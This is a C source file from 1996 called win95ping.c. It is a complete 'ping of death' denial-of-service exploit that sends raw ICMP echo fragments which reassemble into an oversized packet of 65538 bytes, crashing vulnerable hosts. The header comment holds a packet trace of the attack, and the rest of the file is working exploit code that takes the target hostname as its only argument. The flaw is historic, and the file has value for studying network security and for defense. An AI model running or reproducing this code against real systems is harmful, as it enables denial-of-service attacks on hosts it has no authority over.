/*
 * win95ping.c
 *
 * Simulate the evil win95 "ping -l 65510 buggyhost".
 * version 1.0 Bill Fenner <fenner@freebsd.org> 22-Oct-1996
 * version 1.01 Mike Bremford <Mike.Bremford@bl.uk> patched for Linux
 * version 1.02 Barak Pearlmutter <bap@sloan.salk.edu> clean compile
 *
 * This requires raw sockets that don't mess with the packet at all (other
 * than adding the checksum).  That means that SunOS, Solaris, and
 * BSD4.3-based systems are out.  BSD4.4 systems (FreeBSD, NetBSD,
 * OpenBSD, BSDI) will work.  Linux might work, I don't have a Linux
 * system to try it on.
 *
 * The attack from the Win95 box looks like:
 * 17:26:11.013622 cslwin95 > arkroyal: icmp: echo request (frag 6144:1480@0+)
 * 17:26:11.015079 cslwin95 > arkroyal: (frag 6144:1480@1480+)
 * 17:26:11.016637 cslwin95 > arkroyal: (frag 6144:1480@2960+)
 * 17:26:11.017577 cslwin95 > arkroyal: (frag 6144:1480@4440+)
 * 17:26:11.018833 cslwin95 > arkroyal: (frag 6144:1480@5920+)
 * 17:26:11.020112 cslwin95 > arkroyal: (frag 6144:1480@7400+)
 * 17:26:11.021346 cslwin95 > arkroyal: (frag 6144:1480@8880+)
 * 17:26:11.022641 cslwin95 > arkroyal: (frag 6144:1480@10360+)
 * 17:26:11.023869 cslwin95 > arkroyal: (frag 6144:1480@11840+)
 * 17:26:11.025140 cslwin95 > arkroyal: (frag 6144:1480@13320+)
 * 17:26:11.026604 cslwin95 > arkroyal: (frag 6144:1480@14800+)
 * 17:26:11.027628 cslwin95 > arkroyal: (frag 6144:1480@16280+)
 * 17:26:11.028871 cslwin95 > arkroyal: (frag 6144:1480@17760+)
 * 17:26:11.030100 cslwin95 > arkroyal: (frag 6144:1480@19240+)
 * 17:26:11.031307 cslwin95 > arkroyal: (frag 6144:1480@20720+)
 * 17:26:11.032542 cslwin95 > arkroyal: (frag 6144:1480@22200+)
 * 17:26:11.033774 cslwin95 > arkroyal: (frag 6144:1480@23680+)
 * 17:26:11.035018 cslwin95 > arkroyal: (frag 6144:1480@25160+)
 * 17:26:11.036576 cslwin95 > arkroyal: (frag 6144:1480@26640+)
 * 17:26:11.037464 cslwin95 > arkroyal: (frag 6144:1480@28120+)
 * 17:26:11.038696 cslwin95 > arkroyal: (frag 6144:1480@29600+)
 * 17:26:11.039966 cslwin95 > arkroyal: (frag 6144:1480@31080+)
 * 17:26:11.041218 cslwin95 > arkroyal: (frag 6144:1480@32560+)
 * 17:26:11.042579 cslwin95 > arkroyal: (frag 6144:1480@34040+)
 * 17:26:11.043807 cslwin95 > arkroyal: (frag 6144:1480@35520+)
 * 17:26:11.046276 cslwin95 > arkroyal: (frag 6144:1480@37000+)
 * 17:26:11.047236 cslwin95 > arkroyal: (frag 6144:1480@38480+)
 * 17:26:11.048478 cslwin95 > arkroyal: (frag 6144:1480@39960+)
 * 17:26:11.049698 cslwin95 > arkroyal: (frag 6144:1480@41440+)
 * 17:26:11.050929 cslwin95 > arkroyal: (frag 6144:1480@42920+)
 * 17:26:11.052164 cslwin95 > arkroyal: (frag 6144:1480@44400+)
 * 17:26:11.053398 cslwin95 > arkroyal: (frag 6144:1480@45880+)
 * 17:26:11.054685 cslwin95 > arkroyal: (frag 6144:1480@47360+)
 * 17:26:11.056347 cslwin95 > arkroyal: (frag 6144:1480@48840+)
 * 17:26:11.057313 cslwin95 > arkroyal: (frag 6144:1480@50320+)
 * 17:26:11.058357 cslwin95 > arkroyal: (frag 6144:1480@51800+)
 * 17:26:11.059588 cslwin95 > arkroyal: (frag 6144:1480@53280+)
 * 17:26:11.060787 cslwin95 > arkroyal: (frag 6144:1480@54760+)
 * 17:26:11.062023 cslwin95 > arkroyal: (frag 6144:1480@56240+)
 * 17:26:11.063247 cslwin95 > arkroyal: (frag 6144:1480@57720+)
 * 17:26:11.064479 cslwin95 > arkroyal: (frag 6144:1480@59200+)
 * 17:26:11.066252 cslwin95 > arkroyal: (frag 6144:1480@60680+)
 * 17:26:11.066957 cslwin95 > arkroyal: (frag 6144:1480@62160+)
 * 17:26:11.068220 cslwin95 > arkroyal: (frag 6144:1480@63640+)
 * 17:26:11.069107 cslwin95 > arkroyal: (frag 6144:398@65120)
 * 
 */
#ifdef LINUX
#define REALLY_RAW
#define __BSD_SOURCE
#ifndef IP_MF
#define IP_MF           0x2000
#define IP_DF           0x4000
#define IP_CE           0x8000
#define IP_OFFSET       0x1FFF
#endif
#endif

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>

/*
 * If your kernel doesn't muck with raw packets, #define REALLY_RAW.
 * This is probably only Linux.
 */
#ifdef REALLY_RAW
#define FIX(x)  htons(x)
#else
#define FIX(x)  (x)
#endif


int
main(int argc, char **argv)
{
        int s;
        char buf[1500];
        struct ip *ip = (struct ip *)buf;
#ifdef LINUX
        struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
#else
        struct icmp *icmp = (struct icmp *)(ip + 1);
#endif
        struct hostent *hp;
        struct sockaddr_in dst;
        int offset;
        int on = 1;

        bzero(buf, sizeof buf);

        if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
                perror("socket");
                exit(1);
        }
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
                perror("IP_HDRINCL");
                exit(1);
        }
        if (argc != 2) {
                fprintf(stderr, "usage: %s hostname\n", argv[0]);
                exit(1);
        }
        if ((hp = gethostbyname(argv[1])) == NULL) {
                if ((ip->ip_dst.s_addr = inet_addr(argv[1])) == -1) {
                        fprintf(stderr, "%s: unknown host\n", argv[1]);
                        exit(1);
                }
        } else {
                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
        }
        printf("Sending to %s\n", inet_ntoa(ip->ip_dst));
        ip->ip_v = 4;
        ip->ip_hl = sizeof *ip >> 2;
        ip->ip_tos = 0;
        ip->ip_len = FIX(sizeof buf);
        ip->ip_id = htons(4321);
        ip->ip_off = FIX(0);
        ip->ip_ttl = 255;
        ip->ip_p = 1;
#ifdef LINUX    
        ip->ip_csum = 0;                 /* kernel fills in */
#else
        ip->ip_sum = 0;                 /* kernel fills in */
#endif
        ip->ip_src.s_addr = 0;          /* kernel fills in */

        dst.sin_addr = ip->ip_dst;
        dst.sin_family = AF_INET;

#ifdef LINUX
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->checksum = htons(~(ICMP_ECHO << 8));
                /* the checksum of all 0's is easy to compute */
#else
        icmp->icmp_type = ICMP_ECHO;
        icmp->icmp_code = 0;
        icmp->icmp_cksum = htons(~(ICMP_ECHO << 8));
                /* the checksum of all 0's is easy to compute */
#endif

        for (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip)) {
                ip->ip_off = FIX(offset >> 3);
                if (offset < 65120)
                        ip->ip_off |= FIX(IP_MF);
                else
                        ip->ip_len = FIX(418);  /* make total 65538 */
                if (sendto(s, buf, sizeof buf, 0, (struct sockaddr *)&dst,
                                        sizeof dst) < 0) {
                        fprintf(stderr, "offset %d: ", offset);
                        perror("sendto");
                }
                if (offset == 0) {
#ifdef LINUX
                        icmp->type = 0;
                        icmp->code = 0;
                        icmp->checksum = 0;
#else
                        icmp->icmp_type = 0;
                        icmp->icmp_code = 0;
                        icmp->icmp_cksum = 0;
#endif
                }
        }
        return 0;
}
